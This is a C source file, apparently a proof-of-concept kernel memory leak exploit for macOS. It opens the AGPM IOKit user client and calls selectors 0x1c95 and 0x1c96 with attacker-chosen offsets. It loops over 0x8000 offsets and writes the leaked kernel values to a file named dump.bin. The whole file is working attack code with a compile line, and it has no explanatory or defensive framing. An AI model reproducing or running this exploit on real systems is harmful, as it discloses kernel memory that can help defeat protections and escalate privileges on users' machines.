// clang -o leak_kmem leak_kmem.c -framework IOKit

#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <IOKit/IOKitLib.h>

void leak(io_connect_t conn, unsigned int offset, int out_fd){
  kern_return_t err;

  uint64_t inputScalar[16];  
  uint64_t inputScalarCnt = 0;

  char inputStruct[4096];
  size_t inputStructCnt = 0;

  uint64_t outputScalar[16];
  uint32_t outputScalarCnt = 0;

  char outputStruct[4096];
  size_t outputStructCnt = 0;

  // clearpstatesoccupancy == 16:
  inputScalarCnt = 0;
  inputStructCnt = 0;
  outputScalarCnt = 0;
  outputStructCnt = 0;

  err = IOConnectCallMethod(
    conn,
    0x1c95,
    inputScalar,
    inputScalarCnt,
    inputStruct,
    inputStructCnt,
    outputScalar,
    &outputScalarCnt,
    outputStruct,
    &outputStructCnt); 

  if (err != KERN_SUCCESS){
    printf("IOConnectCall error: %x\n", err);
    return;
  }

  //selector 0x1c96 = jumptable 17
  inputScalarCnt = 1;
  inputScalar[0] = offset;//0xffffff00; 
  
  inputStructCnt = 0;

  outputScalarCnt = 4;
  memset(outputScalar, 0, sizeof(outputScalar));

  outputStructCnt = 0;

  err = IOConnectCallMethod(
    conn,
    0x1c96,
    inputScalar,
    inputScalarCnt,
    inputStruct,
    inputStructCnt,
    outputScalar,
    &outputScalarCnt,
    outputStruct,
    &outputStructCnt); 

  if (err != KERN_SUCCESS){
    printf("IOConnectCall error: %x\n", err);
    return;
  }
  write(out_fd, &outputScalar[0], 8);
}

int main(){
  kern_return_t err;

  CFMutableDictionaryRef matching = IOServiceMatching("AGPM");
  if(!matching){
    printf("unable to create service matching dictionary\n");
    return 0;
  }

  io_iterator_t iterator;
  err = IOServiceGetMatchingServices(kIOMasterPortDefault, matching, &iterator);
  if (err != KERN_SUCCESS){
    printf("no matches\n");
    return 0;
  }

  io_service_t service = IOIteratorNext(iterator);

  if (service == IO_OBJECT_NULL){
    printf("unable to find service\n");
    return 0;
  }
  printf("got service: %x\n", service);

  io_connect_t conn = MACH_PORT_NULL;
  err = IOServiceOpen(service, mach_task_self(), 0, &conn);
  if (err != KERN_SUCCESS){
    printf("unable to get user client connection\n");
    return 0;
  }
  
  printf("got userclient connection: %x\n", conn);
  
  int out_fd = open("dump.bin", O_RDWR|O_CREAT|O_TRUNC, 0644);

  for(unsigned int i = 0; i < 0x8000; i++){
    leak(conn, i, out_fd);
  }

  close(out_fd);
  return 1;
}
